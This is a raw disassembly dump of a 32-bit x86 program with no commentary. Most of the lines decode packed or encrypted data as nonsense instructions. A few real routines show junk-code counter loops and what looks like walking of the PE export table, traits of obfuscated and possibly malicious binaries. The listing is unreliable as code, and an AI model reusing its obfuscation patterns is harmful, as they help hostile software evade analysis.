  40e9ef:	shl    BYTE PTR [edi+esi*1+0xe],0x3a
  40e9f4:	mov    ds:0xb901e6ee,al
  40e9f9:	out    0xff,al
  40e9fb:	fwait
  40e9fc:	xlat   BYTE PTR ds:[ebx]
  40e9fd:	xchg   ecx,eax
  40e9fe:	mov    ebx,0x84aacaeb
  40ea03:	outs   dx,DWORD PTR ds:[esi]
  40ea04:	or     eax,DWORD PTR [ebx]
  40ea06:	dec    eax
  40ea07:	xor    dh,BYTE PTR [ebx+0x22f6b90e]
  40ea0d:	push   0x20795b73
  40ea12:	inc    ebp
  40ea13:	je     0x40ea31
  40ea15:	push   cs
  40ea16:	add    al,0xfd
  40ea18:	retf   0xdcc2
  40ea1b:	cmc    
  40ea1c:	enter  0x114c,0xc1
  40ea20:	pop    edi
  40ea21:	sbb    eax,0x5c7f3f0b
  40ea26:	dec    esp
  40ea27:	lea    ebx,[ebp+0x38]
  40ea2a:	xchg   esi,eax
  40ea2b:	dec    edi
  40ea2c:	(bad)  
  40ea2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea2f:	fist   WORD PTR [eax+edi*1+0x6dc48581]
  40ea36:	ret    
  40ea37:	jp     0x40e9f7
  40ea39:	popf   
  40ea3a:	cmc    
  40ea3b:	mov    cs,WORD PTR [edx-0x1d]
  40ea3e:	mov    al,0xfa
  40ea40:	and    esi,DWORD PTR [ebp-0xeec3416]
  40ea46:	aas    
  40ea47:	sbb    BYTE PTR [edi-0x46],0x67
  40ea4b:	jmp    0x8b5f:0xce4fae91
  40ea52:	add    eax,0x1e429e8
  40ea57:	stos   BYTE PTR es:[edi],al
  40ea58:	push   edi
  40ea59:	in     eax,dx
  40ea5a:	sub    esp,esi
  40ea5c:	inc    esi
  40ea5d:	mov    esi,0x55ab6a89
  40ea62:	xchg   ebx,eax
  40ea63:	sbb    bl,BYTE PTR [edi]
  40ea65:	rol    BYTE PTR [edi-0x293a7967],cl
  40ea6b:	sbb    ch,ah
  40ea6d:	inc    esp
  40ea6e:	jne    0x40eaa4
  40ea70:	sti    
  40ea71:	cmp    BYTE PTR [eax-0x19b78fd0],0x6d
  40ea78:	push   eax
  40ea79:	sahf   
  40ea7a:	or     al,0x3
  40ea7c:	pusha  
  40ea7d:	mov    dl,0xf1
  40ea7f:	mov    ebx,0x817ec1a7
  40ea84:	popa   
  40ea85:	cdq    
  40ea86:	mov    ds:0xb11273de,al
  40ea8b:	push   edx
  40ea8c:	jge    0x40ea1a
  40ea8e:	mov    esi,0xff6b3ed3
  40ea93:	popf   
  40ea94:	pop    esp
  40ea95:	xor    dl,BYTE PTR [ecx-0x42]
  40ea98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea99:	xchg   edi,eax
  40ea9a:	jp     0x40ea7a
  40ea9c:	std    
  40ea9d:	inc    esi
  40ea9e:	jne    0x40eb18
  40eaa0:	xchg   esi,eax
  40eaa1:	dec    esp
  40eaa2:	aaa    
  40eaa3:	out    0x66,eax
  40eaa5:	inc    ebp
  40eaa6:	sar    BYTE PTR [ecx+0x3390fd50],1
  40eaac:	jb     0x40ea90
  40eaae:	sahf   
  40eaaf:	sub    eax,eax
  40eab1:	xor    DWORD PTR ds:0x5aaa00e3,edx
  40eab7:	jno    0x40ea54
  40eab9:	sbb    eax,0x7d7deabf
  40eabe:	mov    ebx,0xc30335d5
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bl,BYTE PTR [ebx+0x6f]
  40ebb5:	pop    edx
  40ebb6:	sbb    BYTE PTR [edx+0x547e7ea5],0x7f
  40ebbd:	jle    0x40ec3d
  40ebbf:	add    esp,esi
  40ebc1:	pop    ebp
  40ebc2:	es jmp 0x1ca:0xc1fe8349
  40ebca:	jmp    0xdab4:0x98720f45
  40ebd1:	or     bl,BYTE PTR [ebx-0x2ce5dcd3]
  40ebd7:	add    bh,0xa
  40ebda:	cdq    
  40ebdb:	les    esi,FWORD PTR [edi]
  40ebdd:	xchg   ebp,eax
  40ebde:	out    0x4a,eax
  40ebe0:	inc    esp
  40ebe1:	add    eax,0xa3da7907
  40ebe6:	mov    al,0xdb
  40ebe8:	imul   edi,edi,0xffffff9c
  40ebeb:	xor    ebp,esp
  40ebed:	gs loopne 0x40eb7a
  40ebf0:	sub    esi,DWORD PTR [eax-0x259d13c7]
  40ebf6:	cmp    ecx,eax
  40ebf8:	mov    ?,WORD PTR [ebx-0x6dc69f6c]
  40ebfe:	push   ebp
  40ebff:	and    esp,DWORD PTR [esp+ebp*4-0x4e]
  40ec03:	mov    edx,0x1ed1aaef
  40ec08:	test   DWORD PTR [esi],esp
  40ec0a:	jecxz  0x40ec36
  40ec0c:	push   0x45
  40ec0e:	xchg   ebp,eax
  40ec0f:	inc    ebp
  40ec10:	fidivr DWORD PTR [edx+0x5c]
  40ec13:	pop    ebp
  40ec14:	sub    eax,0xd86d3501
  40ec19:	mov    ecx,0x5066aae1
  40ec1e:	jno    0x40ec3b
  40ec20:	aad    0x55
  40ec22:	add    eax,0x3cbdc772
  40ec27:	cld    
  40ec28:	aas    
  40ec29:	test   BYTE PTR [edi+0x7d04929b],0xcc
  40ec30:	adc    esi,DWORD PTR [edx-0x360ba8ec]
  40ec36:	cs or  eax,0xd2290e38
  40ec3c:	or     cl,BYTE PTR [ebp-0x2e]
  40ec3f:	xor    BYTE PTR [ebx+0x73],cl
  40ec42:	jge    0x40ec2b
  40ec44:	mov    bh,0xc9
  40ec46:	out    0x1,eax
  40ec48:	pop    edx
  40ec49:	sub    eax,0x78f8bc91
  40ec4e:	jns    0x40ebe7
  40ec50:	adc    eax,0x988e663f
  40ec55:	push   es
  40ec56:	sub    al,0xf2
  40ec58:	push   esi
  40ec59:	mov    cl,0x9a
  40ec5b:	inc    ecx
  40ec5c:	icebp  
  40ec5d:	test   BYTE PTR [di],dh
  40ec60:	test   eax,0xe30430a1
  40ec65:	add    dh,BYTE PTR [esi-0x224f533a]
  40ec6b:	mov    cl,0x19
  40ec6d:	cs push ebp
  40ec6f:	xor    ah,al
  40ec71:	adc    BYTE PTR [ebx],dh
  40ec73:	and    eax,0x64c9b265
  40ec79:	mov    al,ds:0x566039b5
  40ec7e:	fisttp QWORD PTR [edx]
  40ec80:	jecxz  0x40ec57
  40ec82:	pushf  
  40ec83:	cs add edx,eax
  40ec86:	dec    edi
  40ec87:	in     eax,dx
  40ec88:	stos   BYTE PTR es:[edi],al
  40ec89:	mov    esi,0x5ce0f6a
  40ec8e:	retf   0x10a0
  40ec91:	sbb    DWORD PTR [esp+eax*2-0x7f],ebx
  40ec95:	lock pop ecx
  40ec97:	or     bh,BYTE PTR [eax-0x600a4193]
  40ec9d:	hlt    
  40ec9e:	adc    BYTE PTR [ecx+edx*2],bh
  40eca1:	aam    0x2
  40eca3:	rcr    dh,0xe1
  40eca6:	or     ebp,edi
  40eca8:	arpl   WORD PTR [eax-0x54],di
  40ecab:	inc    esi
  40ecac:	shl    BYTE PTR [esp+edi*4+0x534718a0],1
  40ecb3:	push   esi
  40ecb4:	dec    edx
  40ecb5:	dec    ebp
  40ecb6:	les    esi,FWORD PTR es:[esp+esi*2]
  40ecba:	push   ss
  40ecbb:	and    al,0x84
  40ecbd:	dec    ecx
  40ecbe:	jl     0x40ec71
  40ecc0:	lods   eax,DWORD PTR cs:[esi]
  40ecc2:	cmc    
  40ecc3:	(bad)  
  40ecc4:	jl     0x40ec4d
  40ecc6:	out    dx,eax
  40ecc7:	sub    dl,BYTE PTR [eax+ebp*1]
  40ecca:	and    al,0x4a
  40eccc:	test   BYTE PTR [ecx-0xd6bf107],bl
  40ecd2:	mov    dl,0x60
  40ecd4:	clc    
  40ecd5:	sub    DWORD PTR [ebp+0x3b],esp
  40ecd8:	(bad)  
  40ecda:	out    0x9,eax
  40ecdc:	fsubp  st(6),st
  40ecde:	dec    ecx
  40ecdf:	dec    ebp
  40ece0:	mov    cl,0xc0
  40ece2:	in     al,dx
  40ece3:	popf   
  40ece4:	jg     0x40ec85
  40ece6:	add    cl,ch
  40ece8:	mov    eax,ds:0x611d9121
  40eced:	mov    edx,0xa67a70f4
  40ecf2:	adc    DWORD PTR [eax],ebx
  40ecf4:	shl    BYTE PTR ds:0x85ad2337,cl
  40ecfa:	jne    0x40ec94
  40ecfc:	mov    ebp,0xd2cd8463
  40ed01:	ins    BYTE PTR es:[edi],dx
  40ed02:	push   ss
  40ed03:	dec    ebx
  40ed04:	mov    ebp,0xecc93b34
  40ed09:	or     ah,BYTE PTR [ebp-0x41]
  40ed0c:	aas    
  40ed0d:	jnp    0x40ed88
  40ed0f:	arpl   WORD PTR [edi-0x14b9875c],si
  40ed15:	fwait
  40ed16:	xor    edx,DWORD PTR [esi-0x3bc92b0]
  40ed1c:	inc    ebx
  40ed1d:	into   
  40ed1e:	sbb    eax,0x7d83458e
  40ed23:	cli    
  40ed24:	cdq    
  40ed25:	inc    edx
  40ed26:	cmp    edi,DWORD PTR [eax-0x40]
  40ed29:	stos   BYTE PTR es:[edi],al
  40ed2a:	sbb    DWORD PTR [esi],ebx
  40ed2c:	sub    eax,0x30f099f7
  40ed31:	lods   eax,DWORD PTR ds:[esi]
  40ed32:	dec    ecx
  40ed33:	std    
  40ed34:	aas    
  40ed35:	add    eax,0x7c6a8a5
  40ed3a:	jg     0x40ecd9
  40ed3c:	popf   
  40ed3d:	cmc    
  40ed3e:	mov    ds:0x45576ad8,eax
  40ed43:	nop
  40ed44:	ds pop ebx
  40ed46:	mov    DWORD PTR [edi-0x5a],0xef746a0
  40ed4d:	pop    eax
  40ed4e:	inc    esi
  40ed4f:	sub    DWORD PTR [edi],eax
  40ed51:	dec    BYTE PTR [ebx-0x929dadc]
  40ed57:	jecxz  0x40ed1b
  40ed59:	div    BYTE PTR [ecx-0x3f331806]
  40ed5f:	or     al,0x2e
  40ed61:	jl     0x40ed56
  40ed63:	fmul   QWORD PTR [ebp+0x38]
  40ed66:	adc    al,0x1e
  40ed68:	inc    esi
  40ed69:	push   edx
  40ed6a:	jns    0x40ed3c
  40ed6c:	jl     0x40edec
  40ed6e:	add    edx,edx
  40ed70:	into   
  40ed71:	ins    BYTE PTR es:[edi],dx
  40ed72:	xchg   edi,eax
  40ed73:	sub    ah,BYTE PTR [eax]
  40ed75:	leave  
  40ed76:	xchg   BYTE PTR [esi+0x3],ch
  40ed79:	loope  0x40eddb
  40ed7b:	test   dl,cl
  40ed7d:	inc    ebp
  40ed7e:	mov    bl,0x31
  40ed80:	add    esi,DWORD PTR [ebx-0x6]
  40ed83:	out    dx,eax
  40ed84:	je     0x40eddf
  40ed86:	and    cl,BYTE PTR [ecx-0x1f2e4d2f]
  40ed8c:	cmp    al,0x4d
  40ed8e:	lds    esi,FWORD PTR [edx+0x7b9dafbe]
  40ed94:	sbb    BYTE PTR [eax+0x332bb22d],0xc2
  40ed9b:	sub    ecx,DWORD PTR ds:0x4337d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x28842723]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	cwde   
  40ee77:	inc    ecx
  40ee78:	add    bl,BYTE PTR [eax]
  40ee7a:	add    DWORD PTR [ecx-0x40a80bd],ebp
  40ee80:	inc    ebp
  40ee81:	mov    bh,0xc1
  40ee83:	fsubr  st(2),st
  40ee85:	mov    ecx,0xe095588
  40ee8a:	mov    ah,0x2a
  40ee8c:	mov    WORD PTR [ebx],ds
  40ee8e:	xor    DWORD PTR [eax],edi
  40ee90:	jbe    0x40ee5a
  40ee92:	ret    0xf05
  40ee95:	jge    0x40ee75
  40ee97:	cwde   
  40ee98:	imul   esi
  40ee9a:	repnz sbb al,0x55
  40ee9d:	in     eax,dx
  40ee9e:	dec    esi
  40ee9f:	jnp    0x40ef00
  40eea1:	mov    ecx,es
  40eea3:	stos   BYTE PTR es:[edi],al
  40eea4:	ret    
  40eea5:	and    eax,0x67ffb4e8
  40eeaa:	jg     0x40ee48
  40eeac:	stos   DWORD PTR es:[edi],eax
  40eead:	sub    eax,0xe953e3da
  40eeb2:	ror    ebp,1
  40eeb4:	inc    edx
  40eeb5:	fld    DWORD PTR [eax+0x7551112d]
  40eebb:	int3   
  40eebc:	push   ebx
  40eebd:	test   DWORD PTR [ebp+0x72],ebx
  40eec0:	jge    0x40ee48
  40eec2:	jbe    0x40ee6e
  40eec4:	loop   0x40ef0e
  40eec6:	xchg   esi,eax
  40eec7:	pop    ebp
  40eec8:	mov    al,ds:0x6e635011
  40eecd:	retf   
  40eece:	or     ch,BYTE PTR [ebp+0x29d2840e]
  40eed4:	pop    eax
  40eed5:	adc    al,0xa2
  40eed7:	sbb    ah,BYTE PTR [edi]
  40eed9:	ja     0x40eef0
  40eedb:	mov    edx,0xa294c9ea
  40eee0:	daa    
  40eee1:	xchg   ebp,eax
  40eee2:	add    ecx,DWORD PTR [eax+esi*4+0x66]
  40eee6:	jmp    0x4061898d
  40eeeb:	cld    
  40eeec:	mov    eax,0xbb14b0a5
  40eef1:	das    
  40eef2:	lahf   
  40eef3:	mov    edx,0x2241767a
  40eef8:	into   
  40eef9:	cmp    BYTE PTR [ebx],cl
  40eefb:	jns    0x40ee83
  40eefd:	xchg   esp,ecx
  40eeff:	mov    cl,dl
  40ef01:	jecxz  0x40eedd
  40ef03:	pop    ss
  40ef04:	inc    edx
  40ef05:	cmp    al,0x66
  40ef07:	dec    edi
  40ef09:	dec    ebp
  40ef0a:	dec    esi
  40ef0b:	nop
  40ef0c:	scas   al,BYTE PTR es:[edi]
  40ef0d:	ficomp DWORD PTR [edi-0x414bd05c]
  40ef13:	pop    ebx
  40ef14:	and    eax,0xf395102
  40ef19:	add    esp,DWORD PTR [edx+0x7]
  40ef1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef1d:	and    bl,ch
  40ef1f:	dec    ecx
  40ef20:	les    eax,FWORD PTR [eax-0x76]
  40ef23:	cmp    al,0xde
  40ef25:	xor    edi,esi
  40ef27:	or     eax,0xd68a44d2
  40ef2c:	fsqrt  
  40ef2e:	or     bh,BYTE PTR [eax]
  40ef30:	add    eax,DWORD PTR [ebx+0xd2a4c0b]
  40ef36:	lods   al,BYTE PTR ds:[esi]
  40ef37:	mov    ah,0xdd
  40ef39:	sub    cl,bl
  40ef3b:	fstp   TBYTE PTR ds:0x3f6c7c6d
  40ef41:	inc    eax
  40ef42:	test   bl,ah
  40ef44:	lock sub ecx,DWORD PTR es:[edi+0x57730cc6]
  40ef4c:	push   edx
  40ef4d:	gs push edi
  40ef4f:	pop    eax
  40ef50:	fwait
  40ef51:	call   0x71b9:0x54c80368
  40ef58:	retf   
  40ef59:	stc    
  40ef5a:	stos   DWORD PTR es:[edi],eax
  40ef5b:	out    0xcd,eax
  40ef5d:	mov    ecx,0xf2619201
  40ef62:	xlat   BYTE PTR ds:[ebx]
  40ef63:	push   esi
  40ef64:	leave  
  40ef65:	out    0x95,eax
  40ef67:	push   ss
  40ef68:	loop   0x40ef96
  40ef6a:	pop    ebp
  40ef6b:	adc    eax,0x2c6dde68
  40ef70:	mov    DWORD PTR [esi-0x46],ebx
  40ef73:	in     eax,0xb6
  40ef75:	ss loope 0x40efd7
  40ef78:	xchg   ebp,eax
  40ef79:	adc    dh,BYTE PTR [ecx]
  40ef7b:	sub    ah,bl
  40ef7d:	enter  0x870a,0xe2
  40ef81:	stos   DWORD PTR es:[edi],eax
  40ef82:	mov    esp,0xbb960305
  40ef87:	xor    edx,DWORD PTR [ecx+0x713792e5]
  40ef8d:	out    0x13,eax
  40ef8f:	jle    0x40efff
  40ef91:	pop    eax
  40ef92:	cmp    al,0xb2
  40ef94:	push   ebx
  40ef95:	pusha  
  40ef96:	jno    0x40ef9e
  40ef98:	pop    ss
  40ef99:	cs dec ecx
  40ef9b:	and    al,0x7a
  40ef9d:	sti    
  40ef9e:	sub    BYTE PTR [ecx],dh
  40efa0:	jno    0x40ef77
  40efa2:	ss aas 
  40efa4:	sar    DWORD PTR [eax],1
  40efa6:	push   0x67
  40efa8:	mov    ebx,0x1f752a3c
  40efad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efae:	mov    bl,0xb5
  40efb0:	fisubr DWORD PTR [eax-0x2dbbf1ac]
  40efb6:	push   eax
  40efb7:	push   cs
  40efb8:	cwde   
  40efb9:	mov    edx,0x397e4861
  40efbe:	in     al,dx
  40efbf:	fisub  DWORD PTR [eax+0x40]
  40efc2:	dec    ebx
  40efc3:	ins    DWORD PTR es:[edi],dx
  40efc4:	pop    ebp
  40efc5:	out    0xc0,al
  40efc7:	cmp    ah,cl
  40efc9:	push   ebp
  40efca:	push   cs
  40efcb:	call   0x7021:0xb82a5b55
  40efd2:	in     al,0xc
  40efd4:	xchg   edi,eax
  40efd5:	or     ebp,DWORD PTR [esi-0x34843c8e]
  40efdb:	es jae 0x40f010
  40efde:	xor    BYTE PTR [edx-0x36],dh
  40efe1:	dec    DWORD PTR [edx+0x6c]
  40efe4:	mov    cl,BYTE PTR [ebp-0x4f]
  40efe7:	push   es
  40efe8:	sub    al,al
  40efea:	or     eax,0xcf7a8fa
  40efef:	sbb    ah,0x55
  40eff2:	enter  0xc8ab,0x68
  40eff6:	out    dx,al
  40eff7:	xchg   ecx,eax
  40eff8:	push   ebx
  40eff9:	cs repz add al,0xc4
  40effd:	imul   ecx,DWORD PTR [ebx-0x3a],0x4f
  40f001:	jbe    0x40f018
  40f003:	jge    0x40f004
  40f005:	jmp    0x20b0:0x2a46bbe0
  40f00c:	leave  
  40f00d:	leave  
  40f00e:	retf   0xb80f
  40f011:	cmp    al,0xac
  40f013:	add    al,0x53
  40f015:	(bad)
  40f018:	sub    al,BYTE PTR ds:[ebp-0x76dabf17]
  40f01f:	mov    ebp,0x302ba97e
  40f024:	jnp    0x40f016
  40f026:	test   eax,esi
  40f028:	(bad)  [edi]
  40f02a:	jne    0x40efc0
  40f02c:	sbb    eax,0x44e68d04
  40f031:	stc    
  40f032:	loop   0x40f083
  40f034:	xchg   BYTE PTR ds:[ebx-0x39e21c47],cl
  40f03b:	sub    BYTE PTR [ebp+0x1a8188df],0x79
  40f042:	cmp    al,BYTE PTR [esi-0x132a4771]
  40f048:	mov    ds:0xb6298f9a,al
  40f04d:	lahf   
  40f04e:	dec    edi
  40f04f:	adc    eax,0x5e0c458b
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xb8b91594,ebx
  40f076:	sbb    eax,0x7ea1d60d
  40f07b:	jle    0x40f0f9
  40f07d:	jge    0x40f0fd
  40f07f:	jle    0x40f023
  40f081:	mov    esp,0x45ed8751
  40f086:	lods   eax,DWORD PTR ds:[esi]
  40f087:	in     al,dx
  40f088:	lahf   
  40f089:	xchg   ebx,eax
  40f08a:	push   0xd0050a10
  40f08f:	nop
  40f090:	xor    BYTE PTR [ebp+0x1d],dl
  40f093:	sbb    dl,BYTE PTR [esi-0x3b03700e]
  40f099:	or     esi,DWORD PTR [ebx]
  40f09b:	xchg   ebx,eax
  40f09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f09d:	(bad)  
  40f09e:	jbe    0x40f119
  40f0a0:	pop    ecx
  40f0a1:	dec    esi
  40f0a2:	inc    ecx
  40f0a3:	xchg   BYTE PTR [eax],cl
  40f0a5:	test   DWORD PTR [edx+0x3e1d8acf],edi
  40f0ab:	test   cl,0xb0
  40f0ae:	loop   0x40f128
  40f0b0:	lock mov al,BYTE PTR [edx+0x66db1d08]
  40f0b7:	jb     0x40f134
  40f0b9:	jle    0x40f08a
  40f0bb:	mov    dl,0x93
  40f0bd:	push   es
  40f0be:	mov    ch,0x87
  40f0c0:	push   esp
  40f0c1:	nop
  40f0c2:	add    DWORD PTR ds:0x1e230b8b,edx
  40f0c8:	out    dx,al
  40f0c9:	dec    esp
  40f0ca:	addr16 inc esp
  40f0cc:	pop    esi
  40f0cd:	inc    ebx
  40f0ce:	stos   BYTE PTR es:[edi],al
  40f0cf:	scas   eax,DWORD PTR es:[edi]
  40f0d0:	ficom  DWORD PTR [edx]
  40f0d2:	ds mov db4,ebx
  40f0d6:	cld    
  40f0d7:	gs int 0x75
  40f0da:	mov    bl,0x77
  40f0dc:	ror    BYTE PTR [ecx],0x9
  40f0df:	or     eax,0x84917de6
  40f0e4:	dec    ebp
  40f0e5:	and    DWORD PTR [edx+0x5],eax
  40f0e8:	adc    dl,BYTE PTR [edx-0x3b]
  40f0eb:	mov    dh,0x81
  40f0ed:	icebp  
  40f0ee:	or     al,0xe3
  40f0f0:	lahf   
  40f0f1:	dec    edx
  40f0f2:	mov    dl,0xd3
  40f0f4:	sub    BYTE PTR [ebx-0x1c],dh
  40f0f7:	(bad)  
  40f0f8:	cwde   
  40f0f9:	jmp    0x2f8c:0xaf22c09e
  40f100:	adc    DWORD PTR [edi+0x3a],esi
  40f103:	jecxz  0x40f15d
  40f105:	xchg   ecx,eax
  40f106:	outs   dx,BYTE PTR ds:[esi]
  40f107:	and    DWORD PTR [eax+0x6a],ebp
  40f10a:	add    dl,cl
  40f10c:	xchg   edi,eax
  40f10d:	test   BYTE PTR [ecx+0x19],dh
  40f110:	fsubr  st,st(3)
  40f112:	stos   BYTE PTR es:[edi],al
  40f113:	or     eax,0xb561cdc2
  40f118:	outs   dx,BYTE PTR ds:[esi]
  40f119:	adc    esi,DWORD PTR [ebx-0x75]
  40f11c:	mov    eax,ds:0xb1e8e18
  40f121:	sub    ah,BYTE PTR [edi]
  40f123:	push   cs
  40f124:	jb     0x40f1a4
  40f126:	and    ah,BYTE PTR [esi+0x6f]
  40f129:	mov    ds:0xf52fb168,al
  40f12e:	mov    esp,es
  40f130:	(bad)  
  40f131:	cmp    al,0x47
  40f133:	ror    DWORD PTR [ebp+0x16d73ce9],cl
  40f139:	sub    BYTE PTR [eax-0x32],dh
  40f13c:	inc    ebp
  40f13d:	daa    
  40f13e:	out    dx,eax
  40f13f:	and    ecx,DWORD PTR [ebx]
  40f141:	or     al,bh
  40f143:	cmp    al,0x39
  40f145:	nop
  40f146:	jmp    0x4c02c097
  40f14b:	cmp    al,0x10
  40f14d:	dec    ebp
  40f14e:	inc    edx
  40f14f:	cmp    bh,BYTE PTR ds:0x2625a5b6
  40f155:	inc    ecx
  40f156:	add    ebp,esp
  40f158:	test   eax,0xe5a04e4e
  40f15d:	rcl    DWORD PTR [edx-0x27],cl
  40f160:	cdq    
  40f161:	xchg   edi,eax
  40f162:	repz mov esi,0x9076c571
  40f168:	fnstcw WORD PTR [edx+0x21]
  40f16b:	mov    ds:0xbdb37d01,al
  40f170:	jg     0x40f155
  40f172:	or     al,0x93
  40f174:	(bad)  
  40f175:	iret   
  40f176:	xor    esp,DWORD PTR [esi-0x19cf926e]
  40f17c:	test   DWORD PTR [esi+0x2c536ba7],esp
  40f182:	adc    ebp,esi
  40f184:	popa   
  40f185:	jb     0x40f179
  40f187:	mov    ebp,0x449ff414
  40f18c:	jmp    0x7cf5:0xe78f7ed1
  40f193:	mov    dh,0x85
  40f195:	int3   
  40f196:	pop    edi
  40f197:	daa    
  40f198:	shr    DWORD PTR [esi-0x72],0x18
  40f19c:	adc    bh,cl
  40f19e:	adc    DWORD PTR [ecx-0xdf15510],ebp
  40f1a4:	js     0x40f213
  40f1a6:	lods   al,BYTE PTR ds:[esi]
  40f1a7:	xor    ebx,eax
  40f1a9:	dec    edx
  40f1aa:	enter  0xb208,0x37
  40f1ae:	inc    eax
  40f1af:	popf   
  40f1b0:	jno    0x40f193
  40f1b2:	pop    esi
  40f1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b4:	jnp    0x40f164
  40f1b6:	test   BYTE PTR [ecx+eiz*8+0x5535c21],al
  40f1bd:	shr    DWORD PTR [ebx+edi*4-0x3411c54f],cl
  40f1c4:	add    eax,esi
  40f1c6:	mov    ch,0x28
  40f1c8:	cs out dx,al
  40f1ca:	out    0x7d,eax
  40f1cc:	or     DWORD PTR [ebx+0x4e6584c5],edi
  40f1d2:	add    bl,BYTE PTR [esi]
  40f1d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d5:	or     DWORD PTR [edi],0x72
  40f1d8:	or     eax,0x32d6a9df
  40f1dd:	(bad)  
  40f1de:	push   edx
  40f1df:	xchg   DWORD PTR [ebx+0x13],ebp
  40f1e2:	jne    0x40f170
  40f1e4:	sub    bl,BYTE PTR [ebp+eax*2-0x5530627c]
  40f1eb:	xor    eax,0x2b546dea
  40f1f0:	xchg   DWORD PTR [ebx+0x5c],eax
  40f1f3:	popa   
  40f1f4:	jl     0x40f23a
  40f1f6:	or     BYTE PTR [ebp+0x51],dh
  40f1f9:	pusha  
